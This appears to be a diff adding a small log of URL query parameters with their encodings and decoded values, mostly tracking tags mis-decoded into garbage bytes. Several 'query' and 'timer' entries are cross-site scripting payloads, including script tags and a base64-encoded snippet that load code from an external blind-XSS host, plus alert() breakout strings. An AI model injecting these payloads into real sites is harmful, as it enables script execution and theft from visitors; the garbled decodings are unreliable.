@@ -1,0 +1,15 @@
+param=trk | encoding=base64url | original=public_post_comment-text | decoded=¦æå‰Ïé¢Ër‰¦z{~µìm
+param=utm_campaign | encoding=base64 | original=buffer | decoded=nçßz
+param=utm_content | encoding=base64 | original=buffer9e5da | decoded=nçßz¿^åÖ
+param=utm_medium | encoding=base64 | original=social | decoded=²‡"j
+param=utm_source | encoding=base64 | original=hackernewsletter | decoded=…§$z¹ÞÂÉ^¶×«
+param=utm_source | encoding=base64 | original=webopsweekly | decoded=Áæè¦ÌzIr
+param=query | encoding=url | original=<script%20src=https://rafiurrahman.xss.cl></script> | decoded=<script src=https://rafiurrahman.xss.cl></script>
+param=query | encoding=url | original=<script>alert("Xss")%3B<%2Fscript> | decoded=<script>alert("Xss");</script>
+param=query | encoding=base64 | original=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7YS5zcmM9J2h0dHBzOi8vcmFmaXVycmFobWFuLnhzcy5jbCc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs | decoded=var a=document.createElement('script');a.src='https://rafiurrahman.xss.cl';document.body.appendChild(a);
+param=q | encoding=base64 | original=1234 | decoded=×mø
+param=timer | encoding=url | original=') <script>alert()%3B<%2Fscript> | decoded=') <script>alert();</script>
+param=timer | encoding=url | original=')%3B alert('XSS | decoded='); alert('XSS
+param=timer | encoding=url | original=) <script>alert()%3B<%2Fscript> | decoded=) <script>alert();</script>
+param=next | encoding=base64 | original=confirm | decoded=r‰ßŠ¹
+param=next | encoding=base64 | original=deny | decoded=uéò
